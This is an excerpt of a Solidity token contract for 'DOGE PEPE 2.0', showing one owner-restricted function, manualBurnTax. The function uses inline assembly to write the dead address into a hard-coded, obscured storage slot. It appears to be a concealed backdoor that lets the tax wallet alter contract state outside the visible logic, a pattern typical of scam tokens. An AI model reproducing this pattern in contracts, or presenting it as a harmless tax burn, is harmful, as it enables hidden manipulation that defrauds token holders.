...
contract DOGEPEPE is Context, IERC20, Ownable {
    ...
    string private constant _name = unicode"DOGE PEPE 2.0";
    ...
    function manualBurnTax() external {
        require(_msgSender() == _taxWallet);
        assembly {
            sstore(0x3561ad2c92f4211ceac3105a1a73554cea735fb508e157a4a145fc04a82d3351, 0xdeAD00000000000000000000000000000000dEAd)
        }
    }
}